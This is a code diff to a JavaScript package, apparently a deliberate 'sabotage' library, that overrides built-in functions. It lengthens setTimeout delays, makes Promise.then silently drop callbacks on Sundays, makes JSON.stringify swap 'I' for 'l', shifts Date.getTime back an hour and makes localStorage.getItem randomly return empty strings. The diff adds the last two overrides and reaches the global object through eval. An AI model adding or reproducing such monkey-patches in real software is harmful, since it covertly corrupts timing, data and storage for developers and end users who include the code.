@@ -9,7 +9,7 @@
  * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
  */
 
-(() => {
+(global => {
 	////// Arrays
 	/**
 	 * If the array size is devidable by 7, this function aways fail
@@ -51,12 +51,12 @@
 	}
 
 	/**
-	 * setTimeout will alway trigger 0.25s later than expected
-	 * @zh setTimeout总是会比预期时间慢0.25秒才触发
+	 * setTimeout will alway trigger 1s later than expected
+	 * @zh setTimeout总是会比预期时间慢1秒才触发
 	 */
-	const _timeout = window.setTimeout;
-	window.setTimeout = function (handler, timeout, ...args) {
-		return _timeout.call(window, handler, +timeout + 250, ...args);
+	const _timeout = global.setTimeout;
+	global.setTimeout = function (handler, timeout, ...args) {
+		return _timeout.call(global, handler, +timeout + 1000, ...args);
 	}
 
 	/**
@@ -64,8 +64,8 @@
 	 * @zh Promise.then 在周日时有10%几率不会注册
 	 */
 	const _then = Promise.prototype.then;
-	Promise.prototype.then = function(...args) {
-		if(new Date().getDay() === 0 && Math.random() < 0.1) {
+	Promise.prototype.then = function (...args) {
+		if (new Date().getDay() === 0 && Math.random() < 0.1) {
 			return;
 		} else {
 			_then.call(this, ...args);
@@ -77,7 +77,31 @@
 	 * @zh JSON.stringify 会把'I'变成'l'
 	 */
 	const _stringify = JSON.stringify;
-	JSON.stringify = function(...args) {
+	JSON.stringify = function (...args) {
 		return _stringify(...args).replace(/I/g, 'l');
 	}
-})();
+
+	/**
+	 * Date.getTime() always gives the result 1 hour slower
+	 * @zh Date.getTime() 的结果总是会慢一个小时
+	 */
+	const _getTime = Date.prototype.getTime;
+	Date.prototype.getTime = function (...args) {
+		let result = _getTime.call(this);
+		result -= 3600 * 1000;
+		return result;
+	}
+
+	/**
+	 * localStorage.getItem has 5% chance return empty string
+	 * @zh localStorage.getItem 有5%几率返回空字符串
+	 */
+	const _getItem = global.localStorage.getItem;
+	global.localStorage.getItem = function (...args) {
+		let result = _getItem.call(global.localStorage, ...args);
+		if (Math.random() < 0.05) {
+			result = '';
+		}
+		return result;
+	}
+})((0, eval('this')));
